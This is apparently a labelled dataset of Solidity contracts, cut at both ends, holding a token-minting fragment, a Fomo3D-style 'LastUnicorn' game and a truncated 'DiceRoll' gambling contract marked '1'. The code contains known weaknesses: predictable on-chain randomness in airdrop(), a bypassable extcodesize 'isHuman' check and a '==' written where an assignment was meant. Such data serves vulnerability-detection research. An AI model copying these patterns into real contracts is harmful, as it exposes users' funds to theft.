ownerTimeLastMinted = now;    }                        function poolIssue() public {                 require(pool != address(0));                 require(now > poolTimeLastMinted);        require(pool != address(0));        uint _timePassedSinceLastMint;          uint _tokenMintCount;          bool _mintingSuccess;                   _timePassedSinceLastMint = now.sub(poolTimeLastMinted);        assert(_timePassedSinceLastMint > 0);                 _tokenMintCount = calculateMintTotal(_timePassedSinceLastMint, poolMintRate);                 _mintingSuccess = mint(pool, _tokenMintCount);        require(_mintingSuccess);                 poolTimeLastMinted = now;    }              function setPool(address _newAddress) public onlyOwner {        pool = _newAddress;    }                                            function calculateFraction(uint _numerator, uint _denominator, uint _precision) pure private returns(uint quotient) {                 _numerator = _numerator.mul(10 ** (_precision + 1));                 uint _quotient = ((_numerator.div(_denominator)) + 5) / 10;        return (_quotient);    }                   function calculateMintTotal(uint _timeInSeconds, uint _mintRate) pure private returns(uint mintAmount) {                 return(_timeInSeconds.mul(_mintRate));    }}
0<CODESPLIT>contract RSEvents {         event onNewName    (        uint256 indexed playerID,        address indexed playerAddress,        bytes32 indexed playerName,        bool isNewPlayer,        uint256 affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 amountPaid,        uint256 timeStamp    );             event onEndTx    (        uint256 compressedData,             uint256 compressedIDs,              bytes32 playerName,        address playerAddress,        uint256 ethIn,        uint256 keysBought,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 genAmount,        uint256 potAmount,        uint256 airDropPot    );    	     event onWithdraw    (        uint256 indexed playerID,        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 timeStamp    );             event onWithdrawAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 genAmount    );                  event onBuyAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethIn,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 genAmount    );                  event onReLoadAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 genAmount    );             event onAffiliatePayout    (        uint256 indexed affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 indexed buyerID,        uint256 amount,        uint256 timeStamp    );}
0<CODESPLIT>contract modularLastUnicorn is RSEvents {}
0<CODESPLIT>contract LastUnicorn is modularLastUnicorn {    using SafeMath for *;    using NameFilter for string;    using RSKeysCalc for uint256;	         UnicornInterfaceForForwarder constant private TeamUnicorn = UnicornInterfaceForForwarder(0xBB14004A6f3D15945B3786012E00D9358c63c92a);	UnicornBookInterface constant private UnicornBook = UnicornBookInterface(0x98547788f328e1011065E4068A8D72bacA1DDB49);    string constant public name = "LastUnicorn Round #1";    string constant public symbol = "RS1";    uint256 private rndGap_ = 0;         uint256 constant private rndInit_ = 1 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                     	uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;             mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => RSdatasets.Player) public plyr_;        mapping (uint256 => RSdatasets.PlayerRounds) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         RSdatasets.Round public round_;           uint256 public fees_ = 60;               uint256 public potSplit_ = 45;              constructor()        public    {	}             modifier isActivated() {        require(activated_ == true, "its not ready yet");         _;    }             modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;                assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "non smart contract address only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "too little money");        require(_eth <= 100000000000000000000000, "too much money");        _;        }                 function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                             uint256 _pID = pIDxAddr_[msg.sender];                         buyCore(_pID, plyr_[_pID].laff, _eventData_);    }             function buyXid(uint256 _affCode)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                                 buyCore(_pID, _affCode, _eventData_);    }        function buyXaddr(address _affCode)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         buyCore(_pID, _affID, _eventData_);    }        function buyXname(bytes32 _affCode)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 RSdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         buyCore(_pID, _affID, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 RSdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 reLoadCore(_pID, _affCode, _eth, _eventData_);    }        function reLoadXaddr(address _affCode, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 RSdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                                 reLoadCore(_pID, _affID, _eth, _eventData_);    }        function reLoadXname(bytes32 _affCode, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 RSdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                                 reLoadCore(_pID, _affID, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                         uint256 _now = now;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _eth;                         if (_now > round_.end && round_.ended == false && round_.plyr != 0)        {                         RSdatasets.EventReturns memory _eventData_;                         			round_.ended = true;            _eventData_ = endRound(_eventData_);            			             _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                     emit RSEvents.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.genAmount            );                             } else {                         _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                     emit RSEvents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = UnicornBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                         emit RSEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = UnicornBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit RSEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = UnicornBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit RSEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public         view         returns(uint256)    {                           uint256 _now = now;                         if (_now > round_.strt + rndGap_ && (_now <= round_.end || (_now > round_.end && round_.plyr == 0)))            return ( (round_.keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }             function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _now = now;                if (_now < round_.end)            if (_now > round_.strt + rndGap_)                return( (round_.end).sub(_now) );            else                return( (round_.strt + rndGap_).sub(_now));        else            return(0);    }             function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 if (now > round_.end && round_.ended == false && round_.plyr != 0)        {                         if (round_.plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_.pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID).sub(plyrRnds_[_pID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID).sub(plyrRnds_[_pID].mask)  ),                    plyr_[_pID].aff                );            }                             } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID)),                plyr_[_pID].aff            );        }    }             function getPlayerVaultsHelper(uint256 _pID)        private        view        returns(uint256)    {        return(  ((((round_.mask).add(((((round_.pot).mul(potSplit_)) / 100).mul(1000000000000000000)) / (round_.keys))).mul(plyrRnds_[_pID].keys)) / 1000000000000000000)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256)    {        return        (            round_.keys,                           round_.end,                            round_.strt,                           round_.pot,                            round_.plyr,                           plyr_[round_.plyr].addr,               plyr_[round_.plyr].name,               airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, RSdatasets.EventReturns memory _eventData_)        private    {                 uint256 _now = now;                         if (_now > round_.strt + rndGap_ && (_now <= round_.end || (_now > round_.end && round_.plyr == 0)))         {                         core(_pID, msg.value, _affID, _eventData_);                         } else {                         if (_now > round_.end && round_.ended == false)             {                 			    round_.ended = true;                _eventData_ = endRound(_eventData_);                                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                                 emit RSEvents.onBuyAndDistribute                (                    msg.sender,                     plyr_[_pID].name,                     msg.value,                     _eventData_.compressedData,                     _eventData_.compressedIDs,                     _eventData_.winnerAddr,                     _eventData_.winnerName,                     _eventData_.amountWon,                     _eventData_.newPot,                     _eventData_.genAmount                );            }                                     plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }             function reLoadCore(uint256 _pID, uint256 _affID, uint256 _eth, RSdatasets.EventReturns memory _eventData_)        private    {                 uint256 _now = now;                         if (_now > round_.strt + rndGap_ && (_now <= round_.end || (_now > round_.end && round_.plyr == 0)))         {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                                     core(_pID, _eth, _affID, _eventData_);                         } else if (_now > round_.end && round_.ended == false) {                         round_.ended = true;            _eventData_ = endRound(_eventData_);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                         emit RSEvents.onReLoadAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.genAmount            );        }    }             function core(uint256 _pID, uint256 _eth, uint256 _affID, RSdatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                         if (round_.eth < 100000000000000000000 && plyrRnds_[_pID].eth.add(_eth) > 10000000000000000000)        {            uint256 _availableLimit = (10000000000000000000).sub(plyrRnds_[_pID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                         if (_eth > 1000000000)         {                                     uint256 _keys = (round_.eth).keysRec(_eth);                                     if (_keys >= 1000000000000000000)            {            updateTimer(_keys);                         if (round_.plyr != _pID)                round_.plyr = _pID;                                       _eventData_.compressedData = _eventData_.compressedData + 100;        }                                     if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 100000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                                 airDropTracker_ = 0;            }        }                             _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                                     plyrRnds_[_pID].keys = _keys.add(plyrRnds_[_pID].keys);            plyrRnds_[_pID].eth = _eth.add(plyrRnds_[_pID].eth);                                     round_.keys = _keys.add(round_.keys);            round_.eth = _eth.add(round_.eth);                             _eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);            _eventData_ = distributeInternal(_pID, _eth, _keys, _eventData_);                         		    endTx(_pID, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID)        private        view        returns(uint256)    {        return((((round_.mask).mul(plyrRnds_[_pID].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID].mask));    }             function calcKeysReceived(uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_.strt + rndGap_ && (_now <= round_.end || (_now > round_.end && round_.plyr == 0)))            return ( (round_.eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_.strt + rndGap_ && (_now <= round_.end || (_now > round_.end && round_.plyr == 0)))            return ( (round_.keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(UnicornBook), "only UnicornBook can call this function");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }             function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(UnicornBook), "only UnicornBook can call this function");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }                    function determinePID(RSdatasets.EventReturns memory _eventData_)        private        returns (RSdatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = UnicornBook.getPlayerID(msg.sender);            bytes32 _name = UnicornBook.getPlayerName(_pID);            uint256 _laff = UnicornBook.getPlayerLAff(_pID);                                     pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                                     _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }         function managePlayer(uint256 _pID, RSdatasets.EventReturns memory _eventData_)        private        returns (RSdatasets.EventReturns)    {                             _eventData_.compressedData = _eventData_.compressedData + 10;                return(_eventData_);    }             function endRound(RSdatasets.EventReturns memory _eventData_)        private        returns (RSdatasets.EventReturns)    {                         uint256 _winPID = round_.plyr;                                  uint256 _pot = round_.pot + airDropPot_;                                  uint256 _win = (_pot.mul(45)) / 100;        uint256 _com = (_pot / 10);        uint256 _gen = (_pot.mul(potSplit_)) / 100;                         uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_.keys);        uint256 _dust = _gen.sub((_ppt.mul(round_.keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _com = _com.add(_dust);        }                         plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                         if (!address(TeamUnicorn).call.value(_com)(bytes4(keccak256("deposit()"))))        {            _gen = _gen.add(_com);            _com = 0;        }                         round_.mask = _ppt.add(round_.mask);                             _eventData_.compressedData = _eventData_.compressedData + (round_.end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.newPot = 0;                return(_eventData_);    }             function updateGenVault(uint256 _pID)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID].mask = _earnings.add(plyrRnds_[_pID].mask);        }    }             function updateTimer(uint256 _keys)        private    {                 uint256 _now = now;                         uint256 _newTime;        if (_now > round_.end && round_.plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_.end);                         if (_newTime < (rndMax_).add(_now))            round_.end = _newTime;        else            round_.end = rndMax_.add(_now);    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, RSdatasets.EventReturns memory _eventData_)        private        returns(RSdatasets.EventReturns)    {                 uint256 _com = _eth * 5 / 100;                                 uint256 _aff = _eth / 10;                                  if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit RSEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);        } else {                         _com += _aff;        }        if (!address(TeamUnicorn).call.value(_com)(bytes4(keccak256("deposit()"))))        {                                  }        return(_eventData_);    }             function distributeInternal(uint256 _pID, uint256 _eth, uint256 _keys, RSdatasets.EventReturns memory _eventData_)        private        returns(RSdatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_)) / 100;                         uint256 _air = (_eth / 20);        airDropPot_ = airDropPot_.add(_air);                                 uint256 _pot = (_eth.mul(20) / 100);                                  uint256 _dust = updateMasks(_pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                         round_.pot = _pot.add(_dust).add(round_.pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                                  uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_.keys);        round_.mask = _ppt.add(round_.mask);                                      uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID].mask = (((round_.mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID].mask);                         return(_gen.sub((_ppt.mul(round_.keys)) / (1000000000000000000)));    }             function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID);                         uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }             function endTx(uint256 _pID, uint256 _eth, uint256 _keys, RSdatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                emit RSEvents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }         bool public activated_ = false;    function activate()        public    {                          require(            (msg.sender == 0xcD0fce8d255349092496F131f2900DF25f0569F8),            "only owner can activate"        );                         require(activated_ == false, "LastUnicorn already activated");                         activated_ = true;                round_.strt = now - rndGap_;        round_.end = now + rndInit_;    }}    library RSdatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;        }    struct Round {        uint256 plyr;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;        }}    library RSKeysCalc {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }             function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }             function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}interface UnicornInterfaceForForwarder {    function deposit() external payable returns(bool);}interface UnicornBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);}library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                         require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                         bool _hasNonNumber;                         for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                          (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "string cannot be only numbers");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }}
1<CODESPLIT>contract DiceRoll is SafeMath {    address public owner;    uint8 constant public maxNumber = 99;    uint8 constant public minNumber = 1;    bool public gamePaused;    bool public recommendPaused;    bool public jackpotPaused;    uint256 public contractBalance;    uint16 public houseEdge;    uint256 public maxProfit;    uint16 public maxProfitAsPercentOfHouse;    uint256 public minBet;    uint256 public maxBet;    uint16 public jackpotOfHouseEdge;    uint256 public minJackpotBet;    uint256 public recommendProportion;    uint256 playerProfit;        uint256 public jackpotBlance;    address[] public jackpotPlayer;    uint256 public JackpotPeriods = 1;    uint64 public nextJackpotTime;    uint16 public jackpotPersent = 100;        uint256 public totalWeiWon;    uint256 public totalWeiWagered;    uint256 public betId;    uint256 seed;    modifier betIsValid(uint256 _betSize, uint8 _start, uint8 _end) {        require(_betSize >= minBet && _betSize <= maxBet && _start >= minNumber && _end <= maxNumber);        _;    }        modifier oddEvenBetIsValid(uint256 _betSize, uint8 _oddeven) {        require(_betSize >= minBet && _betSize <= maxBet && (_oddeven == 1 || _oddeven == 0));        _;    }    modifier gameIsActive {        require(!gamePaused);        _;    }        modifier recommendAreActive {        require(!recommendPaused);        _;    }    modifier jackpotAreActive {        require(!jackpotPaused);        _;    }    modifier onlyOwner {        require(msg.sender == owner);        _;    }    event LogResult(uint256 indexed BetID, address indexed PlayerAddress, uint8 DiceResult, uint256 Value, uint8 Status, uint8 Start, uint8 End, uint8 oddeven, uint256 BetValue);    event LogJackpot(uint indexed BetID, address indexed PlayerAddress, uint jackpotValue);    event LogRecommendProfit(uint indexed BetID, address indexed PlayerAddress, uint Profit);    event LogOwnerTransfer(address SentToAddress, uint AmountTransferred);    event SendJackpotSuccesss(address indexed winner, uint256 amount, uint256 JackpotPeriods);        function() public payable{        contractBalance = safeAdd(contractBalance, msg.value);        setMaxProfit();    }    constructor() public {        owner = msg.sender;        houseEdge = 20;          maxProfitAsPercentOfHouse = 100;          minBet = 0.1 ether;        maxBet = 1 ether;        jackpotOfHouseEdge = 500;          recommendProportion = 100;          minJackpotBet = 0.1 ether;        jackpotPersent = 100;      }    function playerRoll(uint8 start, uint8 end, address inviter) public payable gameIsActive betIsValid(msg.value, start, end) {        betId += 1;        uint8 probability = end - start + 1;        playerProfit = ((msg.value * (100 - probability) / probability + msg.value) * (1000 - houseEdge) / 1000) - msg.value;        if(playerProfit > maxProfit) playerProfit = maxProfit;        uint8 random = uint8(rand() % 100 + 1);      